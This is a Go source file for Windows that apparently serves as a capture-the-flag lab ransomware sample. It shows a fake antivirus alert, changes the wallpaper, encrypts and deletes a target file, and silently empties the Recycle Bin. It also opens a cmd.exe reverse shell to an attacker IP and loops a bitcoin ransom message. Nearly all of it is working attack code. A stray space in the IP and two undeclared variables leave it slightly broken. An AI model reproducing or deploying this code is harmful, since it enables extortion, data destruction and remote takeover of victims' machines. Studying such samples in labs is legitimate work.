//final script
package main

import (
	"fmt"

	//methods for Windows API Calls
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	//methods for reverse shell
	"net"
	"os/exec"
	"os"

	//methods to encrypt file
	"crypto/aes"
	"crypto/rand"
	"io/ioutil"
	"crypto/cipher"
	"io"
	"bytes"
)

var (
	//Step 0: Setup DLLs and needed Stuffz
	user_handle = windows.NewLazyDLL("user32.dll")
	shell_handle = windows.NewLazyDLL("Shell32.dll")

	//SystemParamatersInfoW for changing desktop background
	
	//LCTF{flag_numero_three}

	//CHANGE THIS BEFORE RUNNING, attackBox IP
	attackBox_IP = "192.168.127.24 1:8081"
)

func main() {
	//Step 1: Prompt User with a scary alert window that will pop up constantly if the user says no
	consent := 0

	for consent != 1 {
		userInput, _ := openWindow1()

		//check user response, if yes was selected move on
		if userInput == 1 {
			consent = 1
		}
	}

	//Step 2: Change Desktop Background
	bkgd_path := `C:\Users\User\Downloads\bigscare.jpg`
	changeWallpaper(bkgd_path)

	//Step 3: Encrypt File in Desktop\IMPORTANT
	file_path := `C:\Users\User\Desktop\IMPORTANT\confidential_file.txt`
	encryptFile(file_path)

	//Step 4: Delete files from Recycle Bin
	deleteRecycle()

	//Step 5: Send RevShell in background
	rvShell()

	//Step 6: Infinite Loop of scary message asking to send bitcoin to address
	loop := 0
	for loop == 0 {
		openWindow2()
	}
}

//function for r shell to AttackBox
func rvShell() {
	connect, _ := net.Dial("tcp", attackBox_IP)
	thing := exec.Command("cmd.exe")
	thing.Stdin = connect
	thing.Stdout = connect
	thing.Stderr = connect
	thing.Run()

}

func openWindow1() (syscall.Handle, error) {
	ourHeader := "Alert! Virus Detected!"
	ourAlertString := "Alert! Virus Detected. Do you want to install a new antivirus to handle it?"
	lpText, _ := windows.UTF16PtrFromString(ourAlertString)
	lpCaption, _ := windows.UTF16PtrFromString(ourHeader)

	messageBoxW := user_handle.NewProc("MessageBoxW")

	//set hWnd to 0 because we dont need it, set uType to 0x00000030 make the box scary

	resp, _, err := messageBoxW.Call(0, uintptr(unsafe.Pointer(lpText)), uintptr(unsafe.Pointer(lpCaption)), 0x00000001)
	return syscall.Handle(resp), err
}


func openWindow2() (syscall.Handle, error) {
	ourHeader := "YOUR FILES ARE ENCRYPTED"
	ourAlertString := "Your files have been encrypted! Send one bitcoin to address: 1d7t6578hascj238 to decrypt your files!"
	lpText, _ := windows.UTF16PtrFromString(ourAlertString)
	lpCaption, _ := windows.UTF16PtrFromString(ourHeader)

	messageBoxW := user_handle.NewProc("MessageBoxW")

	//set hWnd to 0 because we dont need it, set uType to 0x00000030 make the box scary

	resp, _, err := messageBoxW.Call(0, uintptr(unsafe.Pointer(lpText)), uintptr(unsafe.Pointer(lpCaption)), 0x00000001)
	return syscall.Handle(resp), err
}

func changeWallpaper(backgroundPath string) {
	imagePath, _ := windows.UTF16PtrFromString(backgroundPath)

	/*
			SystemParametersInfoW

			BOOL SystemParametersInfoW(
		  [in]      UINT  uiAction,
		  [in]      UINT  uiParam,
		  [in, out] PVOID pvParam,
		  [in]      UINT  fWinIni
		);

	*/
	//set desktop background using Windows APIs
	procSystemParamInfo = user_handle.NewProc("SystemParametersInfoW")
	procSystemParamInfo.Call(20, 0, uintptr(unsafe.Pointer(imagePath)), 0x001A)

}

func encryptFile(filePath string) {
	plaintext, err := ioutil.ReadFile(filePath);
	if err != nil {
		fmt.Println("An error was discovered!")
	}

	key := []byte("mysupersecret123")

	block, err := aes.NewCipher(key)
    if err != nil {
        panic(err)
    }

    // The IV needs to be unique, but not secure. Therefore it's common to
    // include it at the beginning of the ciphertext.
    ciphertext := make([]byte, aes.BlockSize+len(plaintext))
    iv := ciphertext[:aes.BlockSize]
    if _, err := io.ReadFull(rand.Reader, iv); err != nil {
        panic(err)
    }

    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

    // create a new file for saving the encrypted data.
    f, err := os.Create(`C:\Users\User\Desktop\IMPORTANT\ransom.txt`)
    if err != nil {
        panic(err.Error())
    }
    _, err = io.Copy(f, bytes.NewReader(ciphertext))
    if err != nil {
        panic(err.Error())
    }

    //delete the old file
    err = os.Remove(filePath);
    if err != nil {
    	panic(err.Error())
    }
}

func deleteRecycle(){
	/* 
	SHSTDAPI SHEmptyRecycleBinA(
  		[in, optional] HWND   hwnd,
  		[in, optional] LPCSTR pszRootPath,
                 DWORD  dwFlags
	);
	*/
	
	//set dwFlags to 0x00000001 to delete items in Recycle Bin with no Confirmation dialog
	procDeleteRecycleBin = shell_handle.NewProc("SHEmptyRecycleBinW")
	procDeleteRecycleBin.Call(0,0,0x00000001)

}
